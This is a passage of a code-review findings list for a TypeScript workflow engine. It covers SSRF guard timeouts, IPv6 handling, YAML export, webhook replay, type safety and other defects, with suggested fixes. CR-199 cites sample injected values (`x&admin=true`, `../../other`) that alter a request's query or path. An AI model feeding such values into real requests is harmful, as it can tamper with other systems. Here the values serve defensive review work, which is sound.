- **Location:** `lib/net/ssrf-helpers.ts:44`, `lib/net/ssrf-helpers.ts:49`, `lib/net/ssrf-helpers.ts:56`, `lib/net/ssrf-helpers.ts:83-89`, `lib/net/ssrf-guard.ts:110-121`
- **Problem:** The doc says `SsrfReason` is "caught by the guard", but `resolveAndCheck` does not catch it. Blocked private IPs surface as `SsrfReason`, while scheme and allowlist rejections are `SsrfError`, so `instanceof SsrfError` checks miss the most security-relevant rejection.
- **Evidence:**
  ```ts
  /** Guard-local rejection carrying the classification — caught by the guard. */
  export class SsrfReason extends Error { ... }
  ```
- **Suggested fix:** Throw `SsrfError` from the helpers, moving the class into the helpers file or a shared `ssrf-error.ts`, and delete `SsrfReason`.
- **Effort:** S

### CR-189 [Low] SSRF guard has no DNS timeout and only an idle socket timeout

- **Status at `abaa007`:** **Open**, fix in [Task 60](review-tasks/60-security-process-and-network-isolation.md)
- **Current location:** lib/net/ssrf-helpers.ts:22,30-32; lib/net/ssrf-guard.ts:79-99,175-177
- **Re-verification note:** `lookupAll` still has no timeout (the constant is unused), and `req.setTimeout` is still only an idle timeout applied per hop. A slow-trickle server can keep an http node running indefinitely, and the time budget multiplies across up to 5 redirects. Race the lookup against `RESOLVE_TIMEOUT_MS`, and enforce one total deadline (an `AbortController` or timer started in `guardedRequest`) across all hops.

- **Severity:** Low
- **Category:** Correctness
- **Area:** Area 2 — Engine core & shared lib
- **Source:** ENG-40
- **Related:** CR-187 (ENG-38)
- **Location:** `lib/net/ssrf-helpers.ts:22`, `lib/net/ssrf-helpers.ts:30-32`, `lib/net/ssrf-guard.ts:175-177`
- **Problem:** `lookupAll` has no timeout (the constant is unused). `req.setTimeout` is an inactivity timeout, so a server trickling one byte every few seconds keeps an http node's run alive indefinitely (up to the 5 MB cap). Across redirects (up to 5 hops) the budget multiplies.
- **Evidence:**
  ```ts
  export function lookupAll(hostname: string) {
    return lookup(hostname, { all: true, verbatim: true }) as Promise<...>;
  }
  ...
  req.setTimeout(timeoutMs, () => { req.destroy(...) });
  ```
- **Suggested fix:** Race `lookup` against `RESOLVE_TIMEOUT_MS`. Enforce a total deadline across all hops with one `AbortController`/timer started in `guardedRequest`.
- **Effort:** S

### CR-190 [Low] IPv6 literal URLs never match the IP-literal path, because `URL.hostname` keeps the brackets

- **Status at `abaa007`:** **Open**, fix in [Task 60](review-tasks/60-security-process-and-network-isolation.md)
- **Current location:** lib/net/ssrf-helpers.ts:24-28; lib/net/ssrf-guard.ts:110-113
- **Re-verification note:** Confirmed in Node: `new URL("http://[2001:db8::1]/").hostname` is `"[2001:db8::1]"`, so `ipaddr.isValid` rejects it and the request falls through to a failing DNS lookup. This fails closed, but allowlisted IPv6 literals can never work and the error text is misleading. Strip the surrounding `[`/`]` before `isValid`/`parse`.

- **Severity:** Low
- **Category:** Correctness
- **Area:** Area 2 — Engine core & shared lib
- **Source:** ENG-41
- **Location:** `lib/net/ssrf-helpers.ts:24-28`, `lib/net/ssrf-guard.ts:110-113`
- **Problem:** For `http://[2001:db8::1]/`, `url.hostname` is `"[2001:db8::1]"`. `ipaddr.isValid` rejects it, so it falls through to `dns.lookup("[2001:db8::1]")` and fails. This fails closed (safe), but allowlisted IPv6 endpoints can never work, and the error text is misleading.
- **Evidence:**
  ```ts
  export function validateIpLiteral(hostname: string): Pinned | null {
    if (!ipaddr.isValid(hostname)) return null;
  ```
- **Suggested fix:** Strip the surrounding `[` `]` before `isValid`/`parse`.
- **Effort:** S

### CR-191 [Low] YAML export emits edge endpoints unquoted, so node keys `true`/`false`/`null` break the round-trip

- **Status at `abaa007`:** **Fixed**, [Task 24](review-tasks/24-template-snapshot-and-yaml.md)
- **Current location:** lib/engine/templates/template-yaml.ts:93,143-148; lib/engine/templates/template-store.ts:787
- **Re-verification note:** Edges are still emitted as unquoted `- [${e.from}, ${e.to}]`, and the key regex still allows `true`/`false`/`null`, so export, then import, of such a template fails with "edge endpoints must be node keys". Emit `JSON.stringify(e.from)`/`JSON.stringify(e.to)`, or reserve those keys in validation.

- **Severity:** Low
- **Category:** Correctness
- **Area:** Area 2 — Engine core & shared lib
- **Source:** ENG-42
- **Location:** `lib/engine/templates-yaml.ts:86-94`, `lib/engine/templates-yaml.ts:143-148`, `lib/engine/templates.ts:845`
- **Problem:** Node keys only have to match `/^[a-z][a-z0-9_]*$/i`, which allows `true`, `null` and `False`. Edges are written as `- [${from}, ${to}]` without quoting, so YAML parses these as booleans or null, and import rejects the file with "edge endpoints must be node keys".
- **Evidence:**
  ```ts
  out += `  - [${e.from}, ${e.to}${tail}]\n`;
  ```
- **Suggested fix:** Emit `JSON.stringify(e.from)`/`JSON.stringify(e.to)` (valid YAML flow scalars), or reserve those keys in `validated()`.
- **Effort:** S

### CR-192 [Low] Checklist bulk replace moves protected (started) steps to the top

- **Status at `abaa007`:** **Fixed (Task 27)**

- **Severity:** Low
- **Category:** Correctness
- **Area:** Area 2 — Engine core & shared lib
- **Source:** ENG-43
- **Related:** CR-012 (ENG-07, DATA-29); CR-013 (ENG-08)
- **Location:** `lib/engine/steps.ts:149-196`
- **Problem:** Edited rows get position `i + survivors.length`, and survivors (steps with started or merged children) are re-inserted at positions `0..k-1`. Any bulk edit therefore reorders the checklist so that every started step comes first, ignoring where the user placed it. Fan-out scheduling sorts by `position`, so later scheduling decisions use the wrong order.
- **Evidence:**
  ```ts
  i + survivors.length,
  ...
  for (const [i, survivor] of survivors.entries()) {
    ... survivor.id, flowId, survivor.artifact_id, survivor.meta_id, i,
  ```
- **Suggested fix:** Use the editor's input index as the position for every matched row, survivors included, and append only unmatched survivors at the end. This fits the in-place update fix in ENG-08 (CR-013).
- **Effort:** S

### CR-193 [Low] Schedule triggers drift and are interval-only

- **Status at `abaa007`:** **Fixed** ([Task 25](review-tasks/25-wait-timers-and-poller.md) — interval drift; cron/timezone still interval-only)
- **Current location:** lib/engine/runtime/flow-poller.ts:81-103 (92-93); lib/engine/templates/template-store.ts:895-909
- **Re-verification note:** The next fire is still computed as `now + interval`, so each tick's lateness accumulates. Schedules remain interval-only, with no cron or timezone. Advance from `due` and skip missed slots (`due + ceil((now-due)/iv)*iv`), and add cron plus timezone to the trigger schema if wall-clock schedules are needed.

- **Severity:** Low
- **Category:** Correctness
- **Area:** Area 2 — Engine core & shared lib
- **Source:** ENG-44
- **Location:** `lib/engine/poller.ts:81-103`, `lib/engine/templates.ts:955-968`
- **Problem:** The next fire is `now + interval`, not `due + interval`. With a 30 s tick, each fire is late by up to 30 s and the lateness accumulates. A 60-minute schedule drifts by minutes per day, so "every day at 09:00" is not expressible. The template also stores no timezone.
- **Evidence:**
  ```ts
  db.run(`UPDATE flow_templates SET schedule_next_at=? WHERE id=?`,
    new Date(now + intervalMin * 60_000).toISOString(), t.id);
  ```
- **Suggested fix:** Advance from `due`, skipping missed slots: `due + ceil((now-due)/iv)*iv`. If wall-clock schedules are needed, add cron plus a timezone in the trigger schema.
- **Effort:** S

### CR-194 [Low] Unbounded in-memory maps in long-lived singletons

- **Status at `abaa007`:** **Fixed** ([Task 25](review-tasks/25-wait-timers-and-poller.md))
- **Current location:** lib/cache.ts:9-12,17-22; app/api/tasks/live/route.ts:21; lib/engine/runtime/flow-reconciler.ts:40,44; lib/engine/runtime/flow-poller.ts:23
- **Re-verification note:** `TtlCache` still never evicts, and its keys include free search text, so it grows without bound. `Reconciler.lastReconcile`/`flaggedOrphans` and `FlowPoller.lastCommentCount` are never pruned. The live-task route's stale-on-error fallback reads expired entries through `entry()`, so deleting on expired read would break it. Use a size cap with oldest-first eviction or a periodic sweep of entries much older than the TTL instead, and prune the engine maps on flow delete or when a flow goes inactive.

- **Severity:** Low
- **Category:** Code quality
- **Area:** Area 2 — Engine core & shared lib
- **Source:** ENG-46
- **Location:** `lib/cache.ts:9-12`, `lib/engine/reconcile.ts:40`, `lib/engine/reconcile.ts:44`, `lib/engine/poller.ts:23`
- **Problem:** `TtlCache` never evicts expired entries, so arbitrary search text keys grow forever. `Reconciler.lastReconcile`/`flaggedOrphans` and `FlowPoller.lastCommentCount` are never pruned, even when flows are deleted.
- **Evidence:**
  ```ts
  get(key: string): V | undefined {
    const e = this.entries.get(key);
    if (!e) return undefined;
    if (Date.now() >= e.expiresAt) return undefined; // stale entry left in the map
  ```
- **Suggested fix:** Delete on expired read and cap the size with LRU-ish eviction in `TtlCache`. Prune the engine maps on flow delete, or sweep stale keys periodically.
- **Effort:** S

### CR-195 [Low] `lib/engine` imports the JSONata evaluator from `components/template-editor` (inverted server→UI boundary)

- **Status at `abaa007`:** **Partly fixed**, fix in [Task 50](review-tasks/50-small-module-cleanups.md)
- **Current location:** lib/jsonata/eval.ts:19
- **Re-verification note:** The boundary inversion is fixed. The evaluator moved to `lib/jsonata/` (a barrel at `lib/jsonata/index.ts`, on the ESLint client allowlist), the engine shim `lib/engine/jsonata-eval.ts` is deleted, and both the engine and the condition builder import `@/lib/jsonata`. The only thing left is the module-level compile `cache` Map, which the suggested fix said to make an instance field (low value; optional).

- **Severity:** Low
- **Category:** Boundaries
- **Area:** Area 2 — Engine core & shared lib; Area 6 — Template authoring
- **Source:** ENG-47, TPL-27 (merged duplicate)
- **Location:**
  - ENG-47: `lib/engine/jsonata-eval.ts:13-20`
  - TPL-27: `components/template-editor/condition-builder/jsonata-eval.ts` (imported by `lib/engine/jsonata-eval.ts`)
- **Suggested fix (combined):** Move the pure evaluator (and its cache, as an instance rather than module state) out of `components/template-editor/condition-builder/jsonata-eval.ts` into a neutral client-safe module (e.g. `lib/jsonata.ts`, added to the client allowlist), import it from both the engine and the condition builder, and delete the `lib/engine/jsonata-eval.ts` re-export shim.
- **Effort:** S (sources: ENG-47 S, TPL-27 S)

Original findings, verbatim:

#### ENG-47 (Area 2 — Engine core & shared lib): Server engine imports from `components/` (layering inversion)

- **Severity:** Low
- **Category:** Boundaries
- **Location:** `lib/engine/jsonata-eval.ts:13-20`
- **Problem:** `lib/` re-exports the JSONata evaluator from `@/components/template-editor/condition-builder/jsonata-eval`, so the server engine depends on a UI feature folder. The comment flags it as accepted, but it violates AGENTS.md sections 2.3 and 3.3 layering: deep import across features, with `lib` depending on `components`. Any UI-only edit there now ships into the engine.
- **Evidence:**
  ```ts
  export { evalJsonata, jsonataTruthy, jsonataFail, lintJsonata, templateRefs, type EvalResult,
  } from "@/components/template-editor/condition-builder/jsonata-eval";
  ```
- **Suggested fix:** Move the pure evaluator to a client-safe shared location, `lib/jsonata.ts` (alongside the allowlisted `utils`/`format`/`usage`). Re-export it from the component folder instead.
- **Effort:** S

#### TPL-27 (Area 6 — Template authoring): `lib/engine` imports from `components/template-editor` (inverted boundary)

- **Severity:** Low
- **Category:** Boundaries
- **Location:** `components/template-editor/condition-builder/jsonata-eval.ts` (imported by `lib/engine/jsonata-eval.ts`)
- **Problem:** The server engine depends on a file inside a UI feature folder. Moving or refactoring the condition builder can break the runtime. The file also holds a module-level mutable cache, which §3.1 disallows outside `lib/singleton.ts`. Its comment marks this as "accepted", but it remains a boundary inversion.
- **Evidence:**
  ```ts
  // lib/engine/jsonata-eval.ts:8 (re-export shim)
   * Engine code keeps importing from here (`./jsonata-eval`, `../../jsonata-eval`, ...
  ```
- **Suggested fix:** Move the pure evaluator to a neutral shared module (e.g. `lib/jsonata/` added to the client allowlist, or a `shared/` package with no server imports), and import it from both sides.
- **Effort:** S

### CR-196 [Low] Shared-secret webhook fallback has no replay protection

- **Status at `abaa007`:** **Open**, fix in [Task 58](review-tasks/58-security-webhook-auth.md)
- **Current location:** lib/engine/runtime/hook-store.ts:136-143,155-171; app/api/hooks/[id]/route.ts:43-46
- **Re-verification note:** The `x-devflow-secret` fallback still accepts deliveries with no timestamp or id, and dedup runs only when a `webhook-id` header is present. A captured fallback request can therefore be replayed indefinitely, and each replay starts a new flow or resumes a waiting node. Require `webhook-id` (for dedup) plus a timestamp window on the fallback path, or explicitly document the fallback as replayable.

- **Severity:** Low
- **Category:** Correctness
- **Area:** Area 2 — Engine core & shared lib
- **Source:** ENG-48
- **Related:** CR-069 (ENG-24, DATA-08)
- **Location:** `lib/engine/hooks.ts:135-143`, `lib/engine/hooks.ts:155-171`
- **Problem:** Deliveries verified by the `x-devflow-secret` header carry no timestamp or id. Dedup depends on `webhook-id`, which this path does not require, so a captured request can be replayed indefinitely. Each replay creates a new flow or resumes a waiting node.
- **Evidence:**
  ```ts
  const provided = headers.get(FALLBACK_HEADER) ?? "";
  ...
  if (!provided || !crypto.timingSafeEqual(a, b)) { return { ok: false, ... }; }
  return { ok: true };
  ```
- **Suggested fix:** Document the fallback as replayable, or require a `webhook-id` (for dedup) and a timestamp window on the fallback path too.
- **Effort:** S

### CR-197 [Low] `EventGrouper.group` mutates the caller's event objects

- **Status at `abaa007`:** **Open**, fix in [Task 50](review-tasks/50-small-module-cleanups.md)
- **Current location:** lib/groupEvents.ts:21-23,67-75,95-98; components/chat/timeline.ts:83-84
- **Re-verification note:** `EventGrouper.group` still writes `_data` and `_nodeKey` onto the input rows, and `nodeRunSections` passes TanStack Query cache data straight in, so cached objects are mutated. `_nodeKey` is recomputed on every call, which makes stale values unlikely in practice, but this still breaks the no-mutation rule. Keep the parsed data in a local `WeakMap`, or shallow-copy each event before enriching it.

- **Severity:** Low
- **Category:** Code quality
- **Area:** Area 2 — Engine core & shared lib
- **Source:** ENG-49
- **Location:** `lib/groupEvents.ts:67-75`, `lib/groupEvents.ts:95-98`
- **Problem:** `group()` writes `_data` and `_nodeKey` onto the input rows. When it is called with TanStack Query data from the client, this mutates the cached objects (AGENTS.md section 2.9: no mutation of props or state). Memoized consumers can then see stale `_nodeKey` values when the node map changes.
- **Evidence:**
  ```ts
  e._data = e.data ? JSON.parse(e.data) : {};
  ...
  e._nodeKey = e.node_id ? nodeKeysByNodeId?.get(e.node_id) : undefined;
  ```
- **Suggested fix:** Keep the parsed data in a local `WeakMap<FeedEvent, …>`, or shallow-copy each event before enriching it.
- **Effort:** S

### CR-198 [Low] Jira materialization uses the provider's numeric issue id as the global `tasks.id`

- **Status at `abaa007`:** **Partial** ([Task 31](review-tasks/31-git-host-clients.md) — `db.uid("task_")` on insert; `(type, instance, key)` deferred pending schema approval)
- **Current location:** lib/engine/tasks/providers/jira.ts; lib/integrations/jira/adf-renderer.ts
- **Re-verification note:** The upsert still matches on the globally `UNIQUE` `key` and inserts `id = issue.id`, the provider's numeric id. Several Jira instances can be registered, with one active at a time via `jira.active()`, so switching instances can cause a primary-key collision or re-bind a task to another instance's issue. The file also still holds two classes (`AdfRenderer`). Use `db.uid("task_")` for the id and match on `(type, instance, key)`; this needs a schema change, which must be approved first per AGENTS.md. Move `AdfRenderer` to its own file.

- **Severity:** Low
- **Category:** Correctness
- **Area:** Area 2 — Engine core & shared lib
- **Source:** ENG-50
- **Status:** Needs verification
  - ENG-50: "Instance registration supports several Jira instances, so this needs verification against real multi-instance data."
- **Location:** `lib/engine/tasks/providers/jira.ts:243-262`
- **Problem:** Upserts match on `key` but insert `id = issue.id` (the Jira numeric id). Two Jira instances, or a future second provider, can share numeric ids and keys, which causes a primary-key collision or silently re-binds a flow to another instance's task. Instance registration supports several Jira instances, so this needs verification against real multi-instance data. The file also holds two classes (`AdfRenderer`), against "one class per file".
- **Evidence:**
  ```ts
  const existing = db.get<{ id: string }>(`SELECT id FROM tasks WHERE key=?`, issue.key);
  ...
  VALUES (?,?,?,?,?,?,?,?,?,?,?,?,'jira',?)`, issue.id, issue.key, ...
  ```
- **Suggested fix:** Use `db.uid("task_")` for the row id and match on `(type, instance, key)`. Move `AdfRenderer` to its own file.
- **Effort:** M

### CR-199 [Low] HTTP node: interpolated values go into the URL unencoded

- **Status at `abaa007`:** **Open**, fix in [Task 60](review-tasks/60-security-process-and-network-isolation.md)
- **Current location:** lib/engine/nodes/kinds/http/http-node.ts:114-119,196-221
- **Re-verification note:** `{{input.*}}` and `{{nodes.*}}` values, which can come from agent output or webhook payloads, are still inserted into the URL unencoded. A value like `x&admin=true` or `../other` can change the path or query on the allowlisted host, and the SSRF guard only checks the host. Header values are still inserted raw, so CR/LF fails with an opaque error. Apply `encodeURIComponent` to non-secret values interpolated into `url` (with an explicit raw escape hatch if needed), and reject header values containing `\r` or `\n` with a clear error.

- **Severity:** Low
- **Category:** Correctness
- **Area:** Area 3 — Engine nodes
- **Source:** NODE-32
- **Location:** `lib/engine/nodes/http/http-node.ts:116`, `lib/engine/nodes/http/http-node.ts:198-223`
- **Problem:** `{{input.*}}`/`{{nodes.*}}` values, which can come from upstream agent output or a webhook payload, are inserted into the URL as-is. A value such as `x&admin=true` or `../../other` changes the query or path on the allowlisted host. The SSRF guard checks the host only, not the path or query. Header values are inserted raw too; undici rejects CR/LF, but the failure surfaces as an opaque error.
- **Evidence:**
  ```ts
  const url = this.interpolate(cfg.url, vars);
  ...
  if (typeof v === "string") return v;
  ```
- **Suggested fix:** When interpolating into `url`, apply `encodeURIComponent` to non-secret values (add an explicit `{{raw ...}}` escape hatch if needed). Reject header values containing `\r` or `\n` with a clear error.
- **Effort:** S

### CR-200 [Low] HTTP output and the decision agent prompt carry unbounded payloads

- **Status at `abaa007`:** **Fixed** in [Task 26](review-tasks/26-node-config-validation.md) (`parseRunConfig` on `NodeDefinition`, validated in `runNode` and `setNodeConfig`)
- **Current location:** lib/engine/nodes/kinds/http/http-node.ts:140-147,182-191,240-245; lib/engine/nodes/kinds/decision/decision-node.ts:234,343-344
- **Re-verification note:** `nodes.output` still stores the full parsed body (up to the 5 MB guard cap) plus all response headers. `safeDigest` truncates string bodies only, so for JSON responses the artifact and the chat `reply` are uncapped too. The decision agent prompt still serializes the entire flow context with `JSON.stringify(vars, null, 2)`. Cap the body in the output and in `safeDigest` for non-string bodies (for example by measuring the serialized size), drop or allowlist response headers, and give the decision prompt a size-capped digest of the context.

- **Severity:** Low
- **Category:** Correctness
- **Area:** Area 3 — Engine nodes
- **Source:** NODE-33
- **Location:** `lib/engine/nodes/http/http-node.ts:142-149`, `lib/engine/nodes/http/http-node.ts:241-247`, `lib/engine/nodes/decision/decision-node.ts:347-348`
- **Problem:**
  - Only the *artifact* is capped (`safeDigest`, 20k). `nodes.output` stores the full parsed body, up to the guard's 5 MB cap, along with all response headers. Every downstream `buildFlowContext` loads that.
  - The decision agent prompt `JSON.stringify`s the *entire* flow context (all node outputs) into the prompt, so one large HTTP response can blow past the model's context window or the cost budget.
- **Evidence:**
  ```ts
  const defaultOutput = { status: res.status, ok: res.ok, body: parsedBody, headers: res.headers };
  // decision:
  "Flow state (JSON):", JSON.stringify(vars, null, 2),
  ```
- **Suggested fix:** Cap the body in the output (or keep only `response_map`'s result plus a truncated body). In decision prompts, include a size-capped digest of the context, or only the inherited `input`.
- **Effort:** S

### CR-201 [Low] Magic strings for statuses, artifact kinds, event kinds and pipeline states throughout the nodes

- **Status at `abaa007`:** **Partly fixed**, fix in [Task 44](review-tasks/44-engine-stores-and-constants.md)
- **Current location:** lib/engine/harness/agent-runner.ts:60,119,178,188; lib/engine/nodes/shared/node-support.ts:108,189; lib/engine/nodes/kinds/pipeline/pipeline-node.ts:328,418,427,441,469,474,516,534; lib/engine/nodes/kinds/build/build-node.ts:192,202,341,391,450; lib/engine/nodes/kinds/build/step-build-node.ts:191,226,254; lib/engine/nodes/kinds/merge-request/merge-request-service.ts:70,74,113,127,129; lib/engine/nodes/chains/sdlc-chain.ts:99,121; lib/engine/nodes/kinds/start/start-node.ts:34,74,78
- **Re-verification note:** The chain now uses `NODE_KEYS` (via `keyOfRole`), and `FLOW_STATUS`/`NODE_RUN_STATUS` exist in `constants/flow.ts` (used by agent-node and split-manager). But roughly 100 raw node-status, run-status (`"finished"`), event-kind (`"lifecycle"`, `"mr_failed"`), pipeline-state (`"canceled"`) and `"default_model"` literals remain across the nodes and harness, and the start key `"start"` is still missing from `NODE_KEYS`. Fix: add backend `EVENT_KIND`/`RUN_STATUS`/`PIPELINE_STATUS`/`ARTIFACT_KIND`/`SETTING_KEY` constants, reuse `FLOW_STATUS`, add `START` to `NODE_KEYS`, and replace the literals.

- **Severity:** Low
- **Category:** Code quality
- **Area:** Area 3 — Engine nodes
- **Source:** NODE-34
- **Location:** `lib/engine/nodes/base/node-definition.ts:19,250,263`, `lib/engine/nodes/base/agent-runner.ts:60,76,168-169,177`, `lib/engine/nodes/base/node-support.ts:42,59,82`, `lib/engine/nodes/pipeline/pipeline-node.ts:390,415,450,461`, `lib/engine/nodes/resolve/resolve-node.ts:69,146`, `lib/engine/nodes/decision/decision-node.ts:121`, `lib/engine/nodes/sdlc/chain.ts:58,62,72,122,132,161,185`, `lib/engine/nodes/start/start-node.ts:35`, `lib/engine/nodes/keys.ts:5-12`
- **Problem:** Literals are repeated everywhere instead of named constants:
  - node statuses (`"running"`, `"done"`, `"failed"`, `"awaiting_approval"`, `"approved"`, `"pending"`)
  - run statuses (`'running'`, `'error'`, `"finished"`)
  - artifact kinds (`"plan"`, `"diff"`, `"fix"`, `"review"`, `"resolve"`, `"json"`, `"markdown"`)
  - event kinds (`"lifecycle"`, `"error"`, `"tool"`, `"status"`, `"pipeline"`, `"log"`, `"mr_failed"`)
  - GitLab pipeline states
  - comment statuses
  - the setting key `"default_model"`
  - def keys in `chain.ts` (`"build"`, `"review"`, `"resolve"`), even though `NODE_KEYS` exists
  - the start node's key `"start"`, which isn't in `NODE_KEYS`

  This goes against §2.7.
- **Evidence:**
  ```ts
  const buildKey = this.host.firstKeyOfType(flowId, "build");
  if (pipe.status === "canceled" || pipe.status === "skipped") {
  ```
- **Suggested fix:** Add `NODE_STATUS`, `RUN_STATUS`, `ARTIFACT_KIND`, `EVENT_KIND`, `PIPELINE_STATUS` and `COMMENT_STATUS` `as const` objects (in `lib/engine/constants.ts` or next to `rows.ts`), add `START` to `NODE_KEYS`, and replace the literals in the code that touches them.
- **Effort:** M

### CR-202 [Low] `any`, non-null `!` and unsafe casts in the nodes area

- **Status at `abaa007`:** **Partly fixed**, fix in [Task 46](review-tasks/46-backend-types-cleanup.md)
- **Current location:** lib/engine/harness/agent-runner.ts:118; lib/engine/nodes/kinds/merge-request/merge-request-service.ts:76-77; lib/engine/nodes/kinds/plan/plan-contract.ts:141,144,172; lib/engine/nodes/kinds/plan/branch-refinement.ts:96
- **Re-verification note:** Fixed: the registry no longer uses `NodeDefinition<any, any>`, and the unconstrained `generatePlan` cast is gone. Still open: `runRowId … ?.id as string` still hides a missing run row (have `persistRun` return the id), `catch (e: any)` remains in merge-request-service, and new `!` assertions (`envelope.subPlan!`, `envelope.plan!`, `s.id!`) need explicit guards.

- **Severity:** Low
- **Category:** Code quality
- **Area:** Area 3 — Engine nodes
- **Source:** NODE-35
- **Related:** CR-039 (NODE-44, TOOL-01) — fix CR-039 first: lint will report regressions once installed
- **Location:** `lib/engine/nodes/registry.ts:22,28,45,52,61,65,74`, `lib/engine/nodes/merge-request/merge-request-service.ts:76`, `lib/engine/nodes/base/tool-pairer.ts:42`, `lib/engine/nodes/base/pricing-source.ts:109`, `lib/engine/nodes/plan/schema.ts:175,178`, `lib/engine/nodes/plan/plan-node.ts:221,234,708`, `lib/engine/nodes/base/agent-runner.ts:118`, `lib/engine/nodes/plan/plan-node.ts:919`
- **Problem:** `NodeDefinition<any, any>` appears seven times in the registry, plus `catch (e: any)` and several `!` assertions. `runRowId … as string` hides a missing run row: `persistUsage` then updates nothing, without any error. The `(parsed.data as unknown as {markdown:string})` cast exists because `generatePlan<T>` isn't constrained. These break §2.9/§4.2.
- **Evidence:**
  ```ts
  const runRowId = db.get<{ id: string }>(`SELECT id FROM runs WHERE cursor_run_id=?`, runId)?.id as string;
  } catch (e: any) {
  ```
- **Suggested fix:** Use `NodeDefinition<unknown, Record<string, unknown>>`, and `unknown` with narrowing in the catch. Have `persistRun` return the row id. Constrain `generatePlan<T extends { markdown: string }>`. Replace `!` with explicit guards.
- **Effort:** S

### CR-203 [Low] Build, review, resolve and pipeline `chat()` overrides drop the chat panel's model override

- **Status at `abaa007`:** **Partly fixed**, fix in [Task 18](review-tasks/18-terminal-outcome-writer.md)
- **Current location:** lib/engine/nodes/kinds/pipeline/pipeline-node.ts:628-643
- **Re-verification note:** Build, review and resolve now go through `AgentRunNode.chat(ctx, content, model)` and `chatInput(content, model)`, so the chat panel's model is honored. The pipeline override still declares `chat(ctx, content)` and spreads the previous input, so the developer's model pick is ignored (the previous run's model, or the default, is used). Fix: accept `model?: string` and set `model: model ?? null` in the parsed input.

- **Severity:** Low
- **Category:** Correctness
- **Area:** Area 3 — Engine nodes
- **Source:** NODE-36
- **Location:** `lib/engine/nodes/build/build-node.ts:349-352`, `lib/engine/nodes/review/review-node.ts:147-150`, `lib/engine/nodes/resolve/resolve-node.ts:215-218`, `lib/engine/nodes/pipeline/pipeline-node.ts:615-631`
- **Problem:** The base signature is `chat(ctx, content, model?)` and `flow.ts:1522` passes `model`. These four overrides declare `(ctx, content)`, so the model the developer picks in the chat panel is ignored and the run uses the default.
- **Evidence:**
  ```ts
  override async chat(ctx: FlowCtx, content: string): Promise<string> {
    const outcome = await this.run(ctx, this.inputSchema.parse({ feedback: content }), this.nodeConfig(ctx));
  ```
- **Suggested fix:** Accept `model?: string` and pass `model: model ?? null` into the parsed input.
- **Effort:** S

### CR-204 [Low] `StepBuildNode` inherits from `BuildNode` to reuse its config, then ignores that config

- **Status at `abaa007`:** **Fixed**
- **Re-verification note:** `StepBuildNode` now extends `AgentRunNode` directly as a sibling of `BuildNode`. It has its own `configSchema` (only `mcp_sources`, so no dead `prompt_rules`/`branch_pattern` knobs) and composes the shared diff and worktree logic through `BuildRunSupport`.

- **Severity:** Low
- **Category:** Boundaries
- **Area:** Area 3 — Engine nodes
- **Source:** NODE-37
- **Location:** `lib/engine/nodes/build/step-build-node.ts:46-70`, `lib/engine/nodes/build/step-build-node.ts:117-122,183`, `lib/engine/nodes/build/build-node.ts:19-22`
- **Problem:** `StepBuildNode extends BuildNode` but overrides `run`, `triggerRuns` and `capabilities`, and `BuildNode` had to widen `key`/`label` to allow it. The inherited `prompt_rules`/`prompt_body` knobs show in the step's config form but are never applied (no `userRules` passed to `prompts.resolve`), and `branch_pattern` doesn't apply either. This is inheritance used for code reuse, which §3.2 discourages.
- **Evidence:**
  ```ts
  const prompt = prompts.resolve(NODE_KEYS.STEP_BUILD, {...}, {...}, input.prompt);   // no { userRules }
  ```
- **Suggested fix:** Make `StepBuildNode` extend `NodeDefinition` directly, with its own `configSchema` (the shared pieces composed in). Pull the shared diff and worktree helpers into a composed `BuildSupport` service. Apply `prompt_rules`, or remove the knob from the step's form.
- **Effort:** M

### CR-205 [Low] `StreamBuffer` reports the wrong "chars omitted" count once text has been capped

- **Status at `abaa007`:** **Fixed** ([Task 16](review-tasks/16-run-lifecycle-late-writes.md))
- **Current location:** lib/engine/harness/stream-buffer.ts; lib/engine/harness/agent-runner.ts
- **Re-verification note:** `capHeadTail` still re-caps the already-capped text on every push, so the "N chars omitted" marker drops earlier counts and under-reports. Tool events are also still emitted immediately while assistant and thinking text waits up to 1.5 s, so the feed shows them out of order. Fix: keep `head`/`tail`/`omitted` counters per buffer, and flush the text buffers before emitting a tool event.

- **Severity:** Low
- **Category:** Correctness
- **Area:** Area 3 — Engine nodes
- **Source:** NODE-38
- **Location:** `lib/engine/nodes/base/stream-buffer.ts:25-30`, `lib/engine/nodes/base/stream-buffer.ts:41-48`
- **Problem:** `capHeadTail` runs on every push over the already-capped text, which contains the previous marker. The new `"N chars omitted"` counts only the overflow from *this* push and throws away the earlier count, so long streams under-report what was dropped. Tool events are also emitted immediately while assistant text waits up to 1.5 s, so the feed shows them out of order.
- **Evidence:**
  ```ts
  b.text = StreamBuffer.capHeadTail(b.text + delta, cap);
  return s.slice(0, head) + `\n… [${(s.length - cap).toLocaleString()} chars omitted] …\n` + s.slice(-tail);
  ```
- **Suggested fix:** Keep `head`, `tail` and `omitted` counters per buffer instead of re-slicing the joined string. Flush the assistant and thinking buffers before emitting a tool event.
- **Effort:** S

### CR-206 [Low] `recover()` contracts are inconsistent across nodes (double-fail, or "recovered" after failing)

- **Status at `abaa007`:** **Open**, fix in [Task 18](review-tasks/18-terminal-outcome-writer.md)
- **Current location:** lib/engine/nodes/kinds/script/script-node.ts:106-112; lib/engine/nodes/kinds/http/http-node.ts:92-98; lib/engine/flow-engine.ts:1955-1961; lib/engine/nodes/shared/node-definition.ts:262-266
- **Re-verification note:** The script node still sets `failed` and emits an error, then returns `false`, so the engine fails the node again (and emits a second error when the run did not finish). The HTTP node still sets `failed` and returns `true` ("recovered"). Fix: have both return `false` with no side effects, and document the contract on `NodeDefinition.recover`.

- **Severity:** Low
- **Category:** Code quality
- **Area:** Area 3 — Engine nodes
- **Source:** NODE-39
- **Location:** `lib/engine/nodes/script/script-node.ts:108-114`, `lib/engine/nodes/http/http-node.ts:94-100`
- **Problem:**
  - The script node sets `failed` and emits an error, then returns `false`. `flow.ts:1739` then sets `failed` and emits a second error.
  - The HTTP node sets `failed`, then returns `true`, meaning "recovered".

  Neither node ever has an agent run to recover, so both paths are effectively dead and contradict each other.
- **Evidence:**
  ```ts
  this.support.setNode(node.id, { status: "failed" });
  db.emitEvent(..., "error", `... retrying re-runs the script; side effects may repeat`);
  return false;
  ```
- **Suggested fix:** Have both return `false` without side effects and let the engine fail the node. Document the contract on `NodeDefinition.recover`.
- **Effort:** S

### CR-207 [Low] Dead code and dead parameters

- **Status at `abaa007`:** **Fixed** (Task 07)
- **Current location:** lib/engine/nodes/kinds/start/contract.ts:87-102; lib/engine/nodes/kinds/script/script-node.ts:168,200-208; lib/engine/nodes/kinds/build/step-build-node.ts:142,290-293; lib/engine/nodes/kinds/plan/plan-context.ts:29,122-123; lib/engine/nodes/shared/node-definition.ts:197
